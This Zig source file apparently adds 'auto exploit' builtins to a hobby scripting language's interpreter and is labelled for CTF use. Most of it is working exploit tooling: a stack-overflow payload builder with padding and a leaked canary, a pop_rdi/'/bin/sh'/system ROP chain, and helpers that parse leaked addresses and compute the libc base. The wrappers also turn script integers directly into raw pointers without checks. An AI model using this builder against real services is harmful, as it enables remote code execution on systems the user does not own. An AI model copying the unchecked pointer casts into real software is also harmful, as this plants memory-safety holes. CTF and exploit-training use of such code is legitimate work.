// PC Language - Auto Exploit Framework (CTF)
const std = @import("std");
const Interpreter = @import("../interpreter.zig").Interpreter;
const Value = @import("../interpreter.zig").Value;
const InterpreterError = @import("../interpreter.zig").InterpreterError;

pub const AutoExploitContext = struct {
    allocator: std.mem.Allocator,
    target_host: []const u8,
    target_port: u16,
    binary_path: ?[]const u8,
    libc_base: ?u64,
    pie_base: ?u64,
    canary: ?u64,
    rop_gadgets: std.StringHashMap(u64),
    exploit_log: std.ArrayList([]const u8),
    
    pub fn init(allocator: std.mem.Allocator, host: []const u8, port: u16) AutoExploitContext {
        return .{
            .allocator = allocator,
            .target_host = host,
            .target_port = port,
            .binary_path = null,
            .libc_base = null,
            .pie_base = null,
            .canary = null,
            .rop_gadgets = std.StringHashMap(u64).init(allocator),
            .exploit_log = std.ArrayList([]const u8).init(allocator),
        };
    }
    
    pub fn deinit(self: *AutoExploitContext) void {
        self.rop_gadgets.deinit();
        self.exploit_log.deinit();
    }
    
    pub fn log(self: *AutoExploitContext, message: []const u8) !void {
        const msg_copy = try self.allocator.dupe(u8, message);
        try self.exploit_log.append(msg_copy);
        std.debug.print("[AutoExploit] {s}\n", .{message});
    }
    
    pub fn setBinary(self: *AutoExploitContext, path: []const u8) void {
        self.binary_path = path;
    }
    
    pub fn setLibcBase(self: *AutoExploitContext, base: u64) !void {
        self.libc_base = base;
        try self.log("Libc base address set");
    }
    
    pub fn setPieBase(self: *AutoExploitContext, base: u64) !void {
        self.pie_base = base;
        try self.log("PIE base address set");
    }
    
    pub fn setCanary(self: *AutoExploitContext, canary_value: u64) !void {
        self.canary = canary_value;
        try self.log("Stack canary leaked");
    }
    
    pub fn addGadget(self: *AutoExploitContext, name: []const u8, address: u64) !void {
        try self.rop_gadgets.put(name, address);
        const msg = try std.fmt.allocPrint(self.allocator, "ROP gadget '{s}' at 0x{x}", .{name, address});
        defer self.allocator.free(msg);
        try self.log(msg);
    }
    
    pub fn buildRopChain(self: *AutoExploitContext) ![]u8 {
        var chain = std.ArrayList(u8).init(self.allocator);
        
        // Example ROP chain builder
        // In real usage, this would be much more sophisticated
        if (self.rop_gadgets.get("pop_rdi")) |pop_rdi| {
            var bytes: [8]u8 = undefined;
            std.mem.writeInt(u64, &bytes, pop_rdi, .little);
            try chain.appendSlice(&bytes);
        }
        
        if (self.rop_gadgets.get("bin_sh")) |bin_sh| {
            var bytes: [8]u8 = undefined;
            std.mem.writeInt(u64, &bytes, bin_sh, .little);
            try chain.appendSlice(&bytes);
        }
        
        if (self.rop_gadgets.get("system")) |system_addr| {
            var bytes: [8]u8 = undefined;
            std.mem.writeInt(u64, &bytes, system_addr, .little);
            try chain.appendSlice(&bytes);
        }
        
        try self.log("ROP chain built successfully");
        return chain.toOwnedSlice();
    }
    
    pub fn buildPayload(self: *AutoExploitContext, padding_size: usize) ![]u8 {
        var payload = std.ArrayList(u8).init(self.allocator);
        
        // Add padding
        try payload.appendNTimes('A', padding_size);
        
        // Add canary if known
        if (self.canary) |canary_value| {
            var bytes: [8]u8 = undefined;
            std.mem.writeInt(u64, &bytes, canary_value, .little);
            try payload.appendSlice(&bytes);
            try self.log("Canary included in payload");
        }
        
        // Add ROP chain
        const rop_chain = try self.buildRopChain();
        try payload.appendSlice(rop_chain);
        
        const msg = try std.fmt.allocPrint(self.allocator, "Payload built: {d} bytes", .{payload.items.len});
        defer self.allocator.free(msg);
        try self.log(msg);
        
        return payload.toOwnedSlice();
    }
    
    pub fn leakAddress(self: *AutoExploitContext, data: []const u8) !u64 {
        // Simple address leak parser (assumes 8-byte little-endian)
        if (data.len < 8) {
            try self.log("Leak data too short");
            return 0;
        }
        
        const addr = std.mem.readInt(u64, data[0..8], .little);
        const msg = try std.fmt.allocPrint(self.allocator, "Address leaked: 0x{x}", .{addr});
        defer self.allocator.free(msg);
        try self.log(msg);
        
        return addr;
    }
    
    pub fn findLibcBase(self: *AutoExploitContext, leaked_func_addr: u64, func_offset: u64) !u64 {
        const base = leaked_func_addr - func_offset;
        try self.setLibcBase(base);
        return base;
    }
};

// Builtin: AutoExploit(host, port) - Create auto exploit context
pub fn builtin_auto_exploit(interp: *Interpreter, args: []Value) InterpreterError!Value {
    if (args.len < 2) return Value.None;
    if (args[0] != .String or args[1] != .Int) return Value.None;
    
    const host = args[0].String;
    const port: u16 = @intCast(args[1].Int);
    
    const ctx_ptr = try interp.allocator.create(AutoExploitContext);
    ctx_ptr.* = AutoExploitContext.init(interp.allocator, host, port);
    
    // 返回一个安全的 Int 值（指针地址压缩到 i64）
    return Value{ .Int = @as(i64, @bitCast(@as(u64, @intFromPtr(ctx_ptr)))) };
}

// AutoExploit method: set_binary(path)
pub fn builtin_ae_set_binary(_: *Interpreter, args: []Value) InterpreterError!Value {
    if (args.len < 2) return Value.None;
    if (args[0] != .Int or args[1] != .String) return Value.None;
    
    const ctx: *AutoExploitContext = @ptrFromInt(@as(usize, @intCast(args[0].Int)));
    ctx.setBinary(args[1].String);
    return Value.None;
}

// AutoExploit method: set_libc_base(addr)
pub fn builtin_ae_set_libc_base(_: *Interpreter, args: []Value) InterpreterError!Value {
    if (args.len < 2) return Value.None;
    if (args[0] != .Int or args[1] != .Int) return Value.None;
    
    const ctx: *AutoExploitContext = @ptrFromInt(@as(usize, @intCast(args[0].Int)));
    try ctx.setLibcBase(@as(u64, @intCast(args[1].Int)));
    return Value.None;
}

// AutoExploit method: add_gadget(name, addr)
pub fn builtin_ae_add_gadget(_: *Interpreter, args: []Value) InterpreterError!Value {
    if (args.len < 3) return Value.None;
    if (args[0] != .Int or args[1] != .String or args[2] != .Int) return Value.None;
    
    const ctx: *AutoExploitContext = @ptrFromInt(@as(usize, @intCast(args[0].Int)));
    try ctx.addGadget(args[1].String, @as(u64, @intCast(args[2].Int)));
    return Value.None;
}

// AutoExploit method: build_payload(padding_size)
pub fn builtin_ae_build_payload(_: *Interpreter, args: []Value) InterpreterError!Value {
    if (args.len < 2) return Value.None;
    if (args[0] != .Int or args[1] != .Int) return Value.None;
    
    const ctx: *AutoExploitContext = @ptrFromInt(@as(usize, @intCast(args[0].Int)));
    const payload = try ctx.buildPayload(@as(usize, @intCast(args[1].Int)));
    return Value{ .String = payload };
}

// AutoExploit method: leak_address(data)
pub fn builtin_ae_leak_address(_: *Interpreter, args: []Value) InterpreterError!Value {
    if (args.len < 2) return Value.None;
    if (args[0] != .Int or args[1] != .String) return Value.None;
    
    const ctx: *AutoExploitContext = @ptrFromInt(@as(usize, @intCast(args[0].Int)));
    const addr = try ctx.leakAddress(args[1].String);
    return Value{ .Int = @as(i64, @intCast(addr)) };
}

// AutoExploit method: find_libc_base(leaked_func, offset)
pub fn builtin_ae_find_libc_base(_: *Interpreter, args: []Value) InterpreterError!Value {
    if (args.len < 3) return Value.None;
    if (args[0] != .Int or args[1] != .Int or args[2] != .Int) return Value.None;
    
    const ctx: *AutoExploitContext = @ptrFromInt(@as(usize, @intCast(args[0].Int)));
    const base = try ctx.findLibcBase(@as(u64, @intCast(args[1].Int)), @as(u64, @intCast(args[2].Int)));
    return Value{ .Int = @as(i64, @intCast(base)) };
}
